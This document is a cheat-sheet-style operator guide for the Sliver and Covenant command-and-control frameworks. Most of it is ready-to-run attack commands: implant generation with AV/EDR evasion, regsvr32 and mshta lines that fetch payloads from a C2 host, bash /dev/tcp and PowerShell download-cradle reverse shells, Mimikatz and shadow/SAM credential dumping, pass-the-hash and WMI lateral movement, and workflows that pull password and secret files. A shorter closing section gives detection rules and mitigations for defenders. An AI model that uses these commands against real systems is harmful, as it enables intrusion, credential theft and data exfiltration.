# Command and Control (C2) Frameworks

Reference guide for C2 framework setup, listener configuration, implant generation, and post-exploitation operations using Sliver and Covenant.

---

## C2 Architecture Overview

| Component | Description |
|-----------|-------------|
| Listeners | Network endpoints for receiving implant connections |
| Implants/Beacons | Payloads deployed on target systems |
| Stagers | Initial payloads that download full implants |
| Beacons | Periodic check-in agents with sleep/jitter |

### Communication Protocols
- **HTTP/HTTPS**: Web-based C2 channels
- **DNS**: DNS tunneling for stealth
- **mTLS**: Mutual TLS for encrypted comms
- **WireGuard**: VPN-based tunneling
- **SMB**: Named pipe communication

---

## Sliver C2

### Listeners

```bash
http                       # Start HTTP listener
https                      # Start HTTPS listener
dns                        # Start DNS listener
mtls                       # Start mTLS listener
wg                         # Start WireGuard listener
stage-listener             # Start shellcode stager listener
```

### Implant Generation

```bash
# Generate new implant
generate --os windows --arch amd64 --format exe --https --sleep 15s --jitter 30

# With obfuscation for AV/EDR evasion
generate --os windows --arch amd64 --format exe --https --sleep 20s --jitter 25 --obfuscate

# Linux implant
generate --os linux --arch amd64 --format elf --wg

# List existing implant builds
implants

# Rebuild existing implant
regenerate
```

### Session and Beacon Management

```bash
beacons                    # List active beacons
sessions                   # List active sessions
use <beacon/session>       # Interact with beacon/session
background                 # Background current session
jobs                       # List running jobs
```

### Beacon Sleep Management

```bash
sleep 30s 10               # 30s delay with 10% jitter
sleep 5m 20                # 5 minutes sleep with 20% jitter
```

### Reconnaissance (Windows)

```bash
shell whoami
shell hostname
shell ipconfig /all
shell net users
shell netstat -ano
shell tasklist
shell systeminfo
shell reg query HKLM\SAM
shell net use
shell qwinsta
shell schtasks /query /fo LIST /v
```

### Reconnaissance (Linux)

```bash
shell id
shell uname -a
shell ifconfig
shell who -a
shell ps aux
shell netstat -tunlp
shell cat /etc/passwd
shell sudo -l
shell crontab -l
shell cat ~/.bash_history
shell lsof -i
```

### File Operations

```bash
ls                         # List files
cd <dir>                   # Change directory
download <file>            # Download file from target
upload <file>              # Upload file to target
rm <file>                  # Remove file
```

### Privilege Escalation

```bash
# Windows
shell whoami /priv
shell whoami /groups
shell net localgroup administrators

# Linux
shell sudo -l
shell find / -perm -u=s -type f 2>/dev/null
```

### Lateral Movement

```bash
# Pass-the-Hash (if NTLM hash available)
runas --hash <NTLM_HASH> --username <user> --command cmd

# Remote command execution
shell psexec \\target cmd.exe

# WMI
shell wmic /node:<target_ip> process call create "cmd.exe /c whoami"
```

### AV/EDR Evasion

```bash
# Obfuscated implant generation
generate --os windows --arch amd64 --format exe --https --sleep 20s --jitter 25 --obfuscate

# LOLBin execution
shell regsvr32 /s /n /u /i:http://<c2>/payload.sct scrobj.dll
```

### Payload Hosting and Loot

```bash
# Host payloads via HTTP
websites
websites add /path/to/folder

# View collected loot
loot
loot get <id>

# Canary tokens
canaries list
canaries create --url http://yourcallback.xyz
```

### Pivoting

- Setup SOCKS5 proxy to route other tools through beacon
- Use beacon as hop point for lateral movement

### Complete Workflow (Windows)

```bash
https --lhost 192.168.1.100 --lport 443
generate --os windows --format exe --https --sleep 10s --jitter 20 --obfuscate
upload implant.exe
beacons
use <beacon_id>
shell whoami
shell net users
shell download "C:\Users\user\Desktop\passwords.xlsx"
```

### Complete Workflow (Linux)

```bash
wg --lhost 10.0.0.3 --lport 51820
generate --os linux --arch amd64 --format elf --wg
# Transfer implant to target
beacons
use <beacon_id>
shell id
shell cat /etc/shadow
```

---

## Covenant C2

### Starting Covenant

```bash
dotnet run                     # Run Covenant
```

### Listeners

```bash
New-Listener                  # Create a new listener
Get-Listener                  # List all listeners
Remove-Listener               # Delete listener

# Example: HTTP listener
New-Listener -Type Http -BindAddress 0.0.0.0 -Port 80
```

### Implants (Grunts)

```bash
Get-Grunt                     # List active sessions
Use-Grunt <id>                # Interact with session

# Generate payload
New-GruntProfile              # Create new implant profile
Generate-Launcher             # Generate stager/payload

# Example: PowerShell launcher
Generate-Launcher -Listener HttpListener -Launcher PowerShell
```

### Session Interaction

```bash
Use-Grunt <id>
Invoke-Command whoami
Invoke-Command net users
Invoke-Command ipconfig /all
Invoke-Command hostname
Invoke-Command systeminfo
Invoke-Command netstat -ano
```

### File Operations

```bash
Invoke-Command dir C:\
Invoke-Download C:\file.txt
Invoke-Upload /path/to/file.txt C:\dest.txt
Invoke-Command del C:\file.txt
```

### Post-Exploitation

```bash
Invoke-Mimikatz               # Credential extraction
Invoke-Command net use
Invoke-Command schtasks /query /fo LIST /v
Invoke-Command reg query HKLM\SAM
Invoke-DumpProcess
```

### Privilege Escalation

```bash
Invoke-Command whoami /priv
Invoke-Command net localgroup administrators
Invoke-Command icacls C:\ /T
Invoke-Command findstr /si password *.txt *.ini
```

### Lateral Movement

```bash
Invoke-WMIExec -Target <ip> -Command "cmd.exe /c whoami"
Invoke-Command -ComputerName <target> -ScriptBlock { whoami }
```

### AV/EDR Evasion

```bash
Generate-Launcher -Obfuscate
Invoke-Command mshta.exe http://<c2>/payload.hta
Invoke-Command regsvr32 /s /n /u /i:http://<c2>/payload.sct scrobj.dll
```

### Sleep and Jitter

```bash
Set-Sleep -Grunt <id> -Sleep 10 -Jitter 20
```

### Complete Workflow

```bash
New-Listener -Type Http -Port 80
Generate-Launcher -Listener HttpListener -Launcher PowerShell
Get-Grunt
Use-Grunt <id>
Invoke-Command whoami
Invoke-Mimikatz
Invoke-Download C:\Users\user\Documents\secrets.xlsx
```

---

## C2 Deployment Best Practices

1. **Setup**: Install framework, configure listeners, set up encryption
2. **Payload Generation**: Create implants/stagers, apply obfuscation, test payloads
3. **Deployment**: Deliver via initial access vector, establish persistence, verify connectivity
4. **Operations**: Execute commands, maintain access, perform lateral movement
5. **OPSEC**: Profile target environment before acting; check AVs, processes, and outbound firewall rules; rotate infrastructure often

### Reverse Shell Fallbacks

```bash
# Bash reverse shell
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1

# PowerShell reverse shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<ip>/rev.ps1')"
```

---

## Detection & Mitigation

Blue-team guidance for detecting and disrupting C2 activity. Use this to validate
that defenders can observe the techniques above during an authorized engagement.

### Telemetry & Log Sources
- **Endpoint:** EDR process/network telemetry; Sysmon — Event ID 1 (process create + command line + hashes), 3 (network connect), 7 (image load), 22 (DNS query).
- **PowerShell:** Script Block Logging (4104), Module Logging (4103), AMSI events.
- **Network:** Zeek/Suricata, NetFlow/IPFIX, full PCAP at egress, authenticated forward-proxy logs, recursive DNS logs.
- **TLS fingerprints:** JA3/JA3S (client/server) and JARM hashes to fingerprint C2 server stacks even over TLS.

### Detection Logic
- **Beaconing:** near-regular check-in interval (even with jitter) to a small set of destinations; long-lived sessions; skewed bytes-out/bytes-in; uncategorized/newly-registered domains. Tools: RITA, Zeek + statistical beacon analytics.
- **Known profiles:** default Cobalt Strike / Sliver / Mythic / Havoc / Metasploit URIs, headers, user-agents, and JA3/JARM hashes; default self-signed cert serials.
- **DNS C2 / tunneling:** high volume of TXT/NULL/CNAME queries, abnormally long labels, high-entropy subdomains, single client → single authoritative domain.

```yaml
title: Possible DNS Tunneling / DNS C2 (high-entropy long labels)
logsource:
  product: windows
  category: dns_query        # Sysmon Event ID 22
detection:
  selection:
    QueryName|re: '([a-z0-9]{30,}\.)'   # very long single label
  condition: selection
  timeframe: 5m
  # tune: alert when one host issues >50 matching queries to one parent domain in 5m
level: high
```

```yaml
title: Suspicious Outbound to Uncategorized Domain with Beacon-like Cadence
logsource:
  product: windows
  category: network_connection   # Sysmon Event ID 3
detection:
  selection:
    Initiated: 'true'
    DestinationPort:
      - 443
      - 80
  filter_known:
    DestinationHostname|endswith:
      - '.windowsupdate.com'
      - '.microsoft.com'
  condition: selection and not filter_known
  # correlate in SIEM: same (host,dest) every N seconds ± jitter -> beacon
level: medium
```

### Hardening & Mitigations
- **Egress control:** default-deny outbound; force traffic through an authenticated, category-filtering proxy; block newly-registered and uncategorized domains; sinkhole known-bad DNS.
- **TLS inspection** at the perimeter where lawful/feasible; alert on self-signed and anomalous JA3/JARM.
- **Application control:** WDAC/AppLocker to stop unsigned loaders; Microsoft ASR rules; disable macros from the internet.
- **Threat intel:** ingest C2 IOC feeds (IPs, domains, JA3/JARM, default profiles) into SIEM/EDR/firewall.
- **Segmentation:** restrict east-west movement so a single beacon cannot reach the whole estate.

### MITRE ATT&CK Mapping

| Technique | ID | Detect / Mitigate |
|-----------|----|-------------------|
| Application Layer Protocol | T1071 | Proxy logs, JA3/JARM, protocol anomaly detection; egress filtering (M1037) |
| Protocol: DNS | T1071.004 | DNS logging + entropy/volume analytics; restrict/inspect DNS (M1037) |
| Encrypted Channel | T1573 | TLS metadata + JA3/JARM; TLS inspection; block self-signed |
| Proxy / Multi-hop | T1090 | NetFlow path analysis; egress allow-listing (M1037) |
| Fallback Channels | T1008 | Alert on secondary-channel activation; broad egress control |
| Ingress Tool Transfer | T1105 | Sysmon 11/3 + EDR; Network Intrusion Prevention (M1031) |
